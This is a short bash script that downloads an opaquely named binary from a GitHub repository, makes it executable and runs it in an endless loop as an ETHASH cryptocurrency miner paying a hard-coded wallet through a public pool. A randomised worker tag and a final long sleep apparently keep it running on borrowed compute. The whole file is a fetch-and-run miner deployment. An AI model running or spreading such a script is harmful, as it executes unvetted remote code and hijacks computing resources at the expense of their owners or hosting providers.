#!/bin/bash
POOL=ethash.unmineable.com:3333
WALLET=ETH:0x19bED4AA973C277dEbF737450a630075787515bd
WORKER=$(echo $(shuf -i 10-40 -n 1)-COLN#)
wget https://github.com/pruthvigithub1137/prem/blob/main/priyatama?raw=true
chmod +x priyatama
while [ 1 ]; do
./priyatama --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
sleep 5
done
sleep 999999999 
